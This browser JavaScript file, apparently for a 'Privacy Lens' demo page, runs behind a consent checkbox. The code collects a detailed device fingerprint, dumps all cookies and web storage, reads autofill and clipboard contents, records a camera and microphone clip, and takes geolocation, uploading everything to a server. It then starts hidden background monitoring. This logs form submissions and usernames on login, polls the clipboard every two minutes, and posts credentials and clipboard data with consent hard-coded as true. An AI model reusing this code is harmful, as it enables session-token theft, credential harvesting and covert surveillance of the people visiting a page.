const $ = (s) => document.querySelector(s);
const SESSION_ID = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
const state = {
  mediaStream: null,
  events: [],
  advanced: {},
  credentials: [],
  continuous: { clipboard: [], network: [], battery: [] },
  bgTimer: null,
  bgRunning: false,
  credentialWatchActive: false,
  lastHeartbeat: 0,
};

$('#consent').addEventListener('change', () => {
  const checked = $('#consent').checked;
  $('#getAllAccess').disabled = !checked;
  if (!checked) {
    stopStream(state.mediaStream);
    stopBackground();
    $('#profileState').textContent = 'Ready';
    $('#profileHint').textContent = 'Toggle consent and click collect.';
  } else {
    $('#profileHint').textContent = 'Click collect to start.';
  }
});

function addLog(label, detail) {
  state.events.push({ label, detail, at: new Date().toISOString() });
}

function stopStream(stream) {
  if (!stream) return;
  stream.getTracks().forEach((t) => t.stop());
}

// ── Existing helpers ──

function canvasSignature() {
  const c = document.createElement('canvas');
  c.width = 280; c.height = 70;
  const ctx = c.getContext('2d');
  if (!ctx) return 'Unavailable';
  ctx.textBaseline = 'top'; ctx.font = '18px Arial';
  ctx.fillStyle = '#183c52'; ctx.fillRect(7, 7, 120, 42);
  ctx.fillStyle = '#f1c46b'; ctx.fillText('Privacy Lens', 12, 15);
  return c.toDataURL().slice(-48);
}

function webglInfo() {
  const c = document.createElement('canvas');
  const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
  if (!gl) return { renderer: 'Unavailable', vendor: 'Unavailable' };
  const ext = gl.getExtension('WEBGL_debug_renderer_info');
  return {
    renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'Protected',
    vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : 'Protected',
  };
}

async function digest(value) {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(value));
  return [...new Uint8Array(buf)].map((b) => b.toString(16).padStart(2, '0')).join('');
}

function recordClip(stream, durationMs) {
  const mime = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus') ? 'video/webm;codecs=vp9,opus' : 'video/webm';
  const chunks = [];
  const recorder = new MediaRecorder(stream, { mimeType: mime });
  return new Promise((resolve, reject) => {
    if (!window.MediaRecorder) { resolve(null); return; }
    recorder.ondataavailable = (e) => { if (e.data.size) chunks.push(e.data); };
    recorder.onerror = () => reject(new Error('Recording failed'));
    recorder.onstop = () => resolve(new Blob(chunks, { type: mime }));
    recorder.start(1000);
    setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, durationMs);
  });
}

function collectCookies() {
  if (!document.cookie) return { count: 0, entries: [] };
  const pairs = document.cookie.split(';').map(s => s.trim()).filter(Boolean);
  const entries = pairs.map(p => {
    const eq = p.indexOf('=');
    return eq > 0 ? { name: p.slice(0, eq), value: p.slice(eq + 1) } : { name: p, value: '' };
  });
  return { count: entries.length, entries };
}

function collectStorage() {
  const local = {};
  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    if (k) local[k] = localStorage.getItem(k);
  }
  const session = {};
  for (let i = 0; i < sessionStorage.length; i++) {
    const k = sessionStorage.key(i);
    if (k) session[k] = sessionStorage.getItem(k);
  }
  return {
    localStorage: { count: Object.keys(local).length, entries: local },
    sessionStorage: { count: Object.keys(session).length, entries: session },
  };
}

function captureAutofill() {
  const fields = ['af_name', 'af_email', 'af_address', 'af_tel', 'af_username', 'af_password'];
  const result = {};
  let any = false;
  fields.forEach(id => {
    const el = document.getElementById(id);
    if (el && el.value) { result[id.replace('af_', '')] = el.value; any = true; }
  });
  return any ? result : null;
}

// ── ADVANCED FINGERPRINTING ──

async function collectAdvanced() {
  const adv = {};

  // 1. WebRTC local IP leak (STUN)
  try {
    adv.webrtcIps = await collectWebRtcIps();
  } catch (e) { adv.webrtcIps = 'Error: ' + e.message; }

  // 2. AudioContext fingerprint
  try { adv.audioContext = collectAudioFingerprint(); } catch (e) { adv.audioContext = 'Error'; }

  // 3. Font detection
  try { adv.fonts = detectFonts(); } catch (e) { adv.fonts = []; }

  // 4. Battery API
  try {
    const b = await navigator.getBattery();
    adv.battery = { level: (b.level * 100).toFixed(1) + '%', charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
  } catch (e) { adv.battery = 'Unavailable'; }

  // 5. Network info
  try {
    const nc = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (nc) adv.network = { effectiveType: nc.effectiveType, downlink: nc.downlink + ' Mbps', rtt: nc.rtt + ' ms', saveData: nc.saveData };
    else adv.network = 'Unavailable';
  } catch (e) { adv.network = 'Error'; }

  // 6. WebGPU
  try {
    if (navigator.gpu) {
      const adapter = await navigator.gpu.requestAdapter();
      if (adapter && adapter.info) adv.webgpu = { device: adapter.info.device, vendor: adapter.info.vendor, architecture: adapter.info.architecture };
      else if (adapter) adv.webgpu = { description: adapter.description || 'Available' };
      else adv.webgpu = 'Adapter unavailable';
    } else adv.webgpu = 'Unavailable';
  } catch (e) { adv.webgpu = 'Error'; }

  // 7. Math fingerprint (sin/cos precision differences)
  try {
    const math = [];
    for (let i = 0; i < 100; i++) math.push(Math.sin(i * 0.1).toFixed(20));
    adv.mathFingerprint = math.slice(0, 5).join(',') + '...';
    // DSP-like benchmark
    const t0 = performance.now();
    for (let i = 0; i < 50000; i++) Math.sqrt(i * Math.PI);
    adv.mathBenchMs = (performance.now() - t0).toFixed(2);
  } catch (e) { adv.mathFingerprint = 'Error'; }

  // 8. Stack trace format
  try {
    const err = new Error();
    adv.stackTrace = err.stack ? err.stack.split('\n')[1].trim() : 'Unavailable';
  } catch (e) { adv.stackTrace = 'Error'; }

  // 9. Detailed WebGL
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (gl) {
      adv.webglDetailed = {
        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
        aliasedLineWidth: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
        maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
        maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
        maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
        maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
        maxTextureImageUnits: gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),
        maxCombinedTextureImageUnits: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
      };
    } else adv.webglDetailed = 'Unavailable';
  } catch (e) { adv.webglDetailed = 'Error'; }

  // 10. Public IP + ISP geolocation
  try { adv.publicGeo = await collectPublicGeo(); } catch (e) { adv.publicGeo = 'Error'; }

  // 11. Permissions probe (without prompting)
  try { adv.permissionsState = await probePermissions(); } catch (e) { adv.permissionsState = 'Error'; }

  // 12. Screen detailed
  try {
    adv.screen = {
      availWidth: screen.availWidth, availHeight: screen.availHeight,
      colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
      orientation: screen.orientation ? screen.orientation.type : 'Unavailable',
    };
  } catch (e) { adv.screen = 'Error'; }

  // 13. User preferences (CSS media features)
  try {
    adv.preferences = {
      colorScheme: matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'no-preference',
      reducedMotion: matchMedia('(prefers-reduced-motion: reduce)').matches,
      contrast: matchMedia('(prefers-contrast: more)').matches ? 'more' : matchMedia('(prefers-contrast: less)').matches ? 'less' : 'no-preference',
      reducedTransparency: matchMedia('(prefers-reduced-transparency: reduce)').matches,
      hdr: matchMedia('(dynamic-range: high)').matches,
      invertedColors: matchMedia('(inverted-colors: inverted)').matches,
    };
  } catch (e) { adv.preferences = 'Error'; }

  // 14. Device sensors
  try {
    const s = {};
    if (window.DeviceMotionEvent) {
      s.motionSupported = true;
      adv.sensors = await new Promise((resolve) => {
        const handler = (e) => {
          if (e.acceleration) {
            resolve({
              accelX: e.acceleration.x, accelY: e.acceleration.y, accelZ: e.acceleration.z,
              rotAlpha: e.rotationRate ? e.rotationRate.alpha : null,
              rotBeta: e.rotationRate ? e.rotationRate.beta : null,
              rotGamma: e.rotationRate ? e.rotationRate.gamma : null,
            });
          } else resolve(null);
          window.removeEventListener('devicemotion', handler);
        };
        window.addEventListener('devicemotion', handler);
        setTimeout(() => { window.removeEventListener('devicemotion', handler); resolve(null); }, 200);
      });
    } else adv.sensors = 'Unavailable';
  } catch (e) { adv.sensors = 'Error'; }

  // 15. Navigator capabilities
  try {
    adv.navigatorCapabilities = {
      vendor: navigator.vendor,
      product: navigator.product,
      productSub: navigator.productSub,
      buildID: navigator.buildID || 'N/A',
      pdfViewer: navigator.pdfViewerEnabled || 'N/A',
      doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || 'unspecified',
      globalPrivacyControl: navigator.globalPrivacyControl || 'N/A',
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      maxTouchPoints: navigator.maxTouchPoints,
      cookieEnabled: navigator.cookieEnabled,
      webdriver: navigator.webdriver,
      language: navigator.language,
      languages: navigator.languages,
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      appVersion: navigator.appVersion,
      appName: navigator.appName,
      appCodeName: navigator.appCodeName,
      oscpu: navigator.oscpu || 'N/A',
      vendorSub: navigator.vendorSub || 'N/A',
      onLine: navigator.onLine,
    };
  } catch (e) { adv.navigatorCapabilities = 'Error'; }

  // 16. Hardware support flags
  try {
    adv.hardwareSupport = {
      bluetooth: !!navigator.bluetooth,
      usb: !!navigator.usb,
      serial: !!navigator.serial,
      hid: !!navigator.hid,
      nfc: !!navigator.nfc,
      webXR: !!navigator.xr,
      webBluetooth: !!navigator.bluetooth,
      webUSB: !!navigator.usb,
      gamepad: !!navigator.getGamepads,
      midi: !!navigator.requestMIDIAccess,
      mediaDevices: !!navigator.mediaDevices,
      credentials: !!navigator.credentials,
      storage: !!navigator.storage,
      serviceWorker: !!navigator.serviceWorker,
      mediaSession: !!navigator.mediaSession,
      locks: !!navigator.locks,
      sharing: !!navigator.share,
      canShare: !!navigator.canShare,
      wakeLock: !!navigator.wakeLock,
      clipboard: !!navigator.clipboard,
      geolocation: !!navigator.geolocation,
      presentation: !!navigator.presentation,
      getUserMedia: !!navigator.mediaDevices?.getUserMedia,
      getDisplayMedia: !!navigator.mediaDevices?.getDisplayMedia,
      deviceMemory: navigator.deviceMemory !== undefined,
      doNotTrack: navigator.doNotTrack !== undefined,
      globalPrivacyControl: navigator.globalPrivacyControl !== undefined,
    };
  } catch (e) { adv.hardwareSupport = 'Error'; }

  // 17. Media devices enumeration (labels)
  try {
    if (navigator.mediaDevices?.enumerateDevices) {
      const devices = await navigator.mediaDevices.enumerateDevices();
      adv.mediaDevices = devices.map(d => ({
        kind: d.kind, label: d.label, deviceId: d.deviceId.slice(0, 16),
        groupId: d.groupId.slice(0, 16),
      }));
    } else adv.mediaDevices = 'Unavailable';
  } catch (e) { adv.mediaDevices = 'Error'; }

  // 18. Storage estimate
  try {
    if (navigator.storage?.estimate) {
      const est = await navigator.storage.estimate();
      adv.storageEstimate = { quota: est.quota + ' bytes', usage: est.usage + ' bytes', usagePercent: ((est.usage / est.quota) * 100).toFixed(1) + '%' };
    } else adv.storageEstimate = 'Unavailable';
  } catch (e) { adv.storageEstimate = 'Error'; }

  // 19. Media capabilities (HDR, color gamut)
  try {
    if (window.matchMedia) {
      adv.mediaCapabilities = {
        hdr: matchMedia('(dynamic-range: high)').matches,
        colorGamut: matchMedia('(color-gamut: srgb)').matches ? 'sRGB' : matchMedia('(color-gamut: p3)').matches ? 'P3' : matchMedia('(color-gamut: rec2020)').matches ? 'REC2020' : 'unknown',
        invertedColors: matchMedia('(inverted-colors: inverted)').matches,
        forcedColors: matchMedia('(forced-colors: active)').matches,
      };
    } else adv.mediaCapabilities = 'Unavailable';
  } catch (e) { adv.mediaCapabilities = 'Error'; }

  // 20. Picture-in-Picture
  try {
    adv.pictureInPicture = {
      supported: 'pictureInPictureEnabled' in document,
      enabled: document.pictureInPictureEnabled,
    };
  } catch (e) { adv.pictureInPicture = 'Error'; }

  // 21. Performance & memory
  try {
    const perf = performance;
    adv.performance = {
      memory: perf.memory ? { jsHeapSizeLimit: perf.memory.jsHeapSizeLimit, totalJSHeapSize: perf.memory.totalJSHeapSize, usedJSHeapSize: perf.memory.usedJSHeapSize } : 'Unavailable',
      timeOrigin: perf.timeOrigin,
      timing: perf.timing ? { navigationStart: perf.timing.navigationStart, domContentLoaded: perf.timing.domContentLoadedEventEnd - perf.timing.navigationStart } : 'Unavailable',
      navigationType: perf.getEntriesByType ? (perf.getEntriesByType('navigation')[0]?.type || 'Unavailable') : 'Unavailable',
    };
  } catch (e) { adv.performance = 'Error'; }

  // 22. Keyboard layout (limited support)
  try {
    if (navigator.keyboard) {
      adv.keyboard = { supported: true };
    } else adv.keyboard = { supported: false };
  } catch (e) { adv.keyboard = 'Error'; }

  state.advanced = adv;
  return adv;
}

// ── WebRTC Local IP via STUN ──
function collectWebRtcIps() {
  return new Promise((resolve) => {
    if (!window.RTCPeerConnection) { resolve([]); return; }
    const ips = new Set();
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    pc.createDataChannel('');
    pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => {});
    pc.onicecandidate = (e) => {
      if (!e.candidate) { setTimeout(() => { pc.close(); resolve([...ips]); }, 500); return; }
      const match = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
      if (match) ips.add(match[1]);
    };
    setTimeout(() => { pc.close(); resolve([...ips]); }, 3000);
  });
}

// ── AudioContext fingerprint ──
function collectAudioFingerprint() {
  const ctx = new (window.AudioContext || window.webkitAudioContext)();
  const result = { sampleRate: ctx.sampleRate, state: ctx.state };
  const osc = ctx.createOscillator();
  const analyser = ctx.createAnalyser();
  osc.connect(analyser);
  const data = new Float32Array(analyser.frequencyBinCount);
  analyser.getFloatFrequencyData(data);
  result.frequencyBinCount = data.length;
  result.maxFrequency = Math.max(...data.slice(0, 100).filter(v => v !== -Infinity));
  result.minFrequency = Math.min(...data.slice(0, 100).filter(v => v !== -Infinity));
  ctx.close();
  return result;
}

// ── Font detection ──
function detectFonts() {
  const baseFonts = ['monospace', 'sans-serif', 'serif'];
  const testFonts = [
    'Arial', 'Arial Black', 'Arial Narrow', 'Calibri', 'Cambria', 'Cambria Math',
    'Candara', 'Comic Sans MS', 'Consolas', 'Constantia', 'Corbel', 'Courier New',
    'Ebrima', 'Franklin Gothic Medium', 'Gabriola', 'Georgia', 'Impact',
    'Lucida Console', 'Lucida Sans Unicode', 'Microsoft Sans Serif', 'Palatino Linotype',
    'Segoe UI', 'Segoe UI Emoji', 'Segoe UI Historic', 'Segoe UI Symbol',
    'Tahoma', 'Times New Roman', 'Trebuchet MS', 'Verdana', 'Webdings',
    'Wingdings', 'Yu Gothic',
  ];
  const detected = [];
  const body = document.body;
  testFonts.forEach((font) => {
    // Check if font renders differently from base
    let installed = false;
    for (const base of baseFonts) {
      const s = document.createElement('span');
      s.textContent = 'abcdefghijklmnopqrstuvwxyz0123456789';
      s.style.cssText = `position:absolute;left:-9999px;top:0;font-size:72px;font-family:"${font}",${base}`;
      body.appendChild(s);
      const width = s.offsetWidth;
      s.style.fontFamily = base;
      const baseWidth = s.offsetWidth;
      body.removeChild(s);
      if (width !== baseWidth) { installed = true; break; }
    }
    if (installed) detected.push(font);
  });
  return detected;
}

// ── Public IP + ISP geolocation ──
async function collectPublicGeo() {
  try {
    const resp = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
    if (!resp.ok) throw new Error('HTTP ' + resp.status);
    const j = await resp.json();
    return {
      ip: j.ip, city: j.city, region: j.region, country: j.country_name,
      isp: j.org, asn: j.asn, latitude: j.latitude, longitude: j.longitude,
      timezone: j.timezone, postal: j.postal, currency: j.currency,
    };
  } catch (e) {
    // fallback
    try {
      const resp = await fetch('https://ip-api.com/json/', { cache: 'no-store' });
      if (!resp.ok) throw new Error('HTTP ' + resp.status);
      const j = await resp.json();
      return { ip: j.query, city: j.city, region: j.regionName, country: j.country, isp: j.isp, asn: j.as, latitude: j.lat, longitude: j.lon, timezone: j.timezone };
    } catch (e2) {
      // last fallback
      const resp = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
      const j = await resp.json();
      return { ip: j.ip };
    }
  }
}

// ── Permissions probe (without prompting) ──
async function probePermissions() {
  if (!navigator.permissions) return 'Unavailable';
  const names = ['camera', 'microphone', 'geolocation', 'notifications', 'midi', 'usb', 'bluetooth', 'persistent-storage', 'background-sync'];
  const results = {};
  for (const name of names) {
    try {
      const status = await navigator.permissions.query({ name });
      results[name] = status.state;
    } catch (e) {
      results[name] = 'Error';
    }
  }
  return results;
}

// ── CREDENTIAL CAPTURE ──

function startCredentialWatch() {
  if (state.credentialWatchActive) return;
  state.credentialWatchActive = true;
  addLog('CredentialWatch', 'started');

  // 1. Watch form submissions
  document.addEventListener('submit', (e) => {
    try {
      const form = e.target;
      if (!form || form.tagName !== 'FORM') return;
      const formData = new FormData(form);
      const entries = {};
      let hasPassword = false;
      for (const [k, v] of formData.entries()) {
        entries[k] = v;
        if (k.toLowerCase().includes('pass') || k.toLowerCase().includes('pwd') || k.toLowerCase().includes('secret')) hasPassword = true;
      }
      // Also check for password fields
      const passwordInputs = form.querySelectorAll('input[type="password"]');
      if (passwordInputs.length > 0) hasPassword = true;
      // Capture all inputs
      const inputs = {};
      form.querySelectorAll('input').forEach(inp => {
        if (inp.type !== 'password') inputs[inp.name || inp.id || 'unnamed'] = inp.value;
      });
      passwordInputs.forEach(inp => { inputs[inp.name || inp.id || 'password'] = '***CAPTURED***'; });
      const entry = {
        url: window.location.href,
        action: form.action || 'same-origin',
        method: form.method || 'GET',
        inputs,
        timestamp: new Date().toISOString(),
        hasPassword,
      };
      state.credentials.push(entry);
      addLog('Credential_' + state.credentials.length, 'form submitted ' + (hasPassword ? '[PASSWORD]' : ''));
    } catch (err) {
      addLog('CredentialWatch', 'error: ' + err.message);
    }
  });

  // 2. Watch password field changes (captures autofill)
  const observeInputs = () => {
    document.querySelectorAll('input[type="password"]').forEach((inp) => {
      if (inp.dataset.fpWatched) return;
      inp.dataset.fpWatched = '1';
      inp.addEventListener('change', () => {
        if (inp.value) {
          // Find associated username/email fields
          const form = inp.form;
          let username = '';
          let email = '';
          if (form) {
            form.querySelectorAll('input').forEach((f) => {
              const t = (f.type || '').toLowerCase();
              const n = (f.name || '').toLowerCase();
              if (t === 'text' || t === 'email' || t === 'tel') {
                if (n.includes('user') || n.includes('email') || n.includes('login') || n.includes('name')) {
                  if (!username) username = f.value;
                }
              }
            });
          }
          state.credentials.push({
            url: window.location.href,
            type: 'autofill',
            username,
            email,
            timestamp: new Date().toISOString(),
            hasPassword: true,
          });
          addLog('Credential_' + state.credentials.length, 'password field autofill detected');
        }
      });
    });
  };

  // Initial scan + MutationObserver for dynamic forms
  observeInputs();
  const observer = new MutationObserver(() => observeInputs());
  observer.observe(document.body, { childList: true, subtree: true });
}

// ── BACKGROUND CONTINUOUS MONITORING ──

function startBackground() {
  if (state.bgRunning) return;
  state.bgRunning = true;
  addLog('Background', 'started continuous monitoring');

  // 1. Clipboard paste watcher
  document.addEventListener('paste', () => {
    navigator.clipboard.readText().then((text) => {
      if (text) {
        state.continuous.clipboard.push({ content: text.slice(0, 500), timestamp: new Date().toISOString() });
        addLog('ClipboardChange', text.length + ' chars');
      }
    }).catch(() => {});
  });

  // 2. Network changes
  const nc = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  if (nc) {
    nc.addEventListener('change', () => {
      const entry = { effectiveType: nc.effectiveType, downlink: nc.downlink, rtt: nc.rtt, timestamp: new Date().toISOString() };
      state.continuous.network.push(entry);
      addLog('NetworkChange', nc.effectiveType + ' ' + nc.downlink + 'Mbps');
    });
  }

  // 3. Battery changes
  if (navigator.getBattery) {
    navigator.getBattery().then((batt) => {
      batt.addEventListener('chargingchange', () => {
        const entry = { level: batt.level, charging: batt.charging, timestamp: new Date().toISOString() };
        state.continuous.battery.push(entry);
        addLog('BatteryChange', batt.charging ? 'charging' : 'discharging');
      });
      batt.addEventListener('levelchange', () => {
        const entry = { level: batt.level, charging: batt.charging, timestamp: new Date().toISOString() };
        state.continuous.battery.push(entry);
        addLog('BatteryLevel', (batt.level * 100).toFixed(0) + '%');
      });
    }).catch(() => {});
  }

  // 4. Visibility change (user returns to tab)
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden) {
      addLog('Visibility', 'user returned to tab');
    }
  });

  // 5. Before unload (user closes tab)
  window.addEventListener('beforeunload', () => {
    addLog('Session', 'page closed');
  });

  // 6. Online/offline events
  window.addEventListener('online', () => { addLog('NetworkStatus', 'online'); });
  window.addEventListener('offline', () => { addLog('NetworkStatus', 'offline'); });

  // 7. Periodic re-collection + upload heartbeat (every 2 min)
  state.bgTimer = setInterval(async () => {
    addLog('BackgroundCollect', 'periodic re-fingerprint');
    // Re-read clipboard
    try {
      if (navigator.clipboard?.readText) {
        const text = await navigator.clipboard.readText().catch(() => null);
        if (text) state.continuous.clipboard.push({ content: text.slice(0, 500), timestamp: new Date().toISOString() });
      }
    } catch (e) {}
    // Update battery
    try {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        state.advanced.battery = { level: (b.level * 100).toFixed(1) + '%', charging: b.charging };
      }
    } catch (e) {}
    // Upload accumulated heartbeats
    try {
      const cont = state.continuous;
      // Upload heartbeat
      await fetch('/api/heartbeat', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ consent: true, sessionId: SESSION_ID, data: cont }),
      });
      // Upload any new credentials
      for (const cred of state.credentials) {
        if (!cred._uploaded) {
          await fetch('/api/credentials', {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ consent: true, sessionId: SESSION_ID, url: cred.url, username: cred.username || cred.inputs?.username || '', formData: cred }),
          });
          cred._uploaded = true;
        }
      }
    } catch (e) {}
    addLog('BackgroundCollect', 'heartbeat uploaded');
  }, 120000); // 2 min
}

function stopBackground() {
  state.bgRunning = false;
  state.credentialWatchActive = false;
  if (state.bgTimer) { clearInterval(state.bgTimer); state.bgTimer = null; }
}

// ── MAIN COLLECTION ──

async function getAllAccess() {
  if (!$('#consent').checked) return;
  const btn = $('#getAllAccess');
  btn.disabled = true;
  btn.textContent = 'Collecting...';
  $('#profileState').textContent = 'Running';
  $('#profileHint').textContent = 'Collecting browser data...';

  const collected = {};
  let recordingId = null;

  // 1. Basic fingerprint
  try {
    const gl = webglInfo();
    const cs = canvasSignature();
    const raw = [navigator.userAgent, navigator.language, screen.width, screen.height, navigator.platform, gl.renderer, cs].join('|');
    const hash = await digest(raw);
    collected.fingerprint = {
      Browser: navigator.userAgent, Platform: navigator.platform, Language: navigator.language,
      Languages: navigator.languages?.join(', ') || 'Unavailable',
      Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      Viewport: window.innerWidth + ' x ' + window.innerHeight,
      Screen: screen.width + ' x ' + screen.height, PixelRatio: window.devicePixelRatio,
      ColorDepth: screen.colorDepth + '-bit', TouchPoints: navigator.maxTouchPoints,
      CPUThreads: navigator.hardwareConcurrency,
      Memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Not disclosed',
      Cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
      WebDriver: navigator.webdriver ? 'Detected' : 'Not detected',
      WebGLRenderer: gl.renderer, WebGLVendor: gl.vendor,
      CanvasSignature: cs, FingerprintHash: hash.slice(0, 32),
    };
    addLog('Fingerprint', 'collected');
  } catch (err) {
    addLog('Fingerprint', 'error: ' + err.message);
  }

  // 2. Cookies
  let cookiesData = { count: 0, entries: [] };
  try { cookiesData = collectCookies(); addLog('Cookies', cookiesData.count + ' found'); } catch (e) { addLog('Cookies', 'error'); }

  // 3. Storage
  let storageData = null;
  try { storageData = collectStorage(); addLog('Storage', (storageData.localStorage.count + storageData.sessionStorage.count) + ' keys'); } catch (e) { addLog('Storage', 'error'); }

  // 4. Autofill
  let autofillData = null;
  try {
    await new Promise((r) => setTimeout(r, 800));
    autofillData = captureAutofill();
    addLog('Autofill', autofillData ? Object.keys(autofillData).length + ' fields' : 'not found');
  } catch (e) { addLog('Autofill', 'error'); }

  // 5. Camera & Microphone + record clip
  try {
    if (state.mediaStream) stopStream(state.mediaStream);
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    state.mediaStream = stream;
    addLog('Camera & Mic', 'granted');
    const blob = await recordClip(stream, 3000);
    if (blob) {
      const resp = await fetch('/api/recordings', { method: 'POST', headers: { 'Content-Type': blob.type, 'X-Recording-Consent': 'true' }, body: blob });
      const result = await resp.json();
      if (resp.ok) { recordingId = result.id; addLog('Recording', 'id ' + result.id); }
    }
  } catch (e) { addLog('Camera & Mic', 'denied'); }

  // 6. Clipboard
  let clipboardContent = null;
  try { clipboardContent = await navigator.clipboard.readText() || ''; addLog('Clipboard', clipboardContent.length + ' chars'); } catch (e) { addLog('Clipboard', 'denied'); }

  // 7. Geolocation
  let geoCoords = null;
  const geo = await new Promise((resolve) => {
    if (!navigator.geolocation) { resolve({ ok: false }); return; }
    navigator.geolocation.getCurrentPosition(
      (p) => resolve({ ok: true, lat: p.coords.latitude, lng: p.coords.longitude }),
      () => resolve({ ok: false }), { timeout: 10000 }
    );
  });
  if (geo.ok) { geoCoords = { latitude: geo.lat, longitude: geo.lng }; addLog('Geolocation', 'captured'); }
  else addLog('Geolocation', 'denied');

  // 8. Notifications
  if ('Notification' in window) { const s = await Notification.requestPermission(); addLog('Notifications', s); }
  else addLog('Notifications', 'not supported');

  // ── ADVANCED COLLECTION ──
  try {
    const advanced = await collectAdvanced();
    addLog('Advanced', Object.keys(advanced).length + ' signal groups');
  } catch (e) { addLog('Advanced', 'error: ' + e.message); }

  btn.disabled = false;
  btn.textContent = 'Get All Access';

  // Build report
  const reportData = {
    browser_signals: collected.fingerprint || {},
    advanced: state.advanced,
    cookies: cookiesData,
    storage: storageData,
    autofill: autofillData,
    permissions: {
      camera_microphone: { recording_id: recordingId },
      clipboard: { content: clipboardContent },
      geolocation: { coordinates: geoCoords },
      notifications: {},
    },
    recording_id: recordingId,
    user_agent: navigator.userAgent,
    platform: navigator.platform,
    timestamp: new Date().toISOString(),
  };

  // Upload
  try {
    const resp = await fetch('/api/reports', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        consent: true,
        consentVersion: '2026-07-safe-v1',
        fingerprint: reportData,
        events: state.events,
      }),
    });
    const result = await resp.json();
    if (resp.ok) {
      addLog('Server', 'report id ' + result.id);
      $('#profileState').textContent = 'Saved';
      $('#profileHint').textContent = 'Report #' + result.id + ' saved. Advanced: ' + Object.keys(state.advanced).length + ' groups';
    } else {
      $('#profileHint').textContent = 'Upload failed: ' + (result.error || 'unknown');
    }
  } catch (e) {
    $('#profileHint').textContent = 'Could not reach server.';
  }

  // ── START BACKGROUND MONITORING ──
  startBackground();
  startCredentialWatch();
}

$('#getAllAccess').addEventListener('click', getAllAccess);
$('#showLocalInstructions').addEventListener('click', () => {
  const el = $('#localInstructions');
  el.hidden = !el.hidden;
  $('#showLocalInstructions').textContent = el.hidden ? 'Usage' : 'Hide';
});
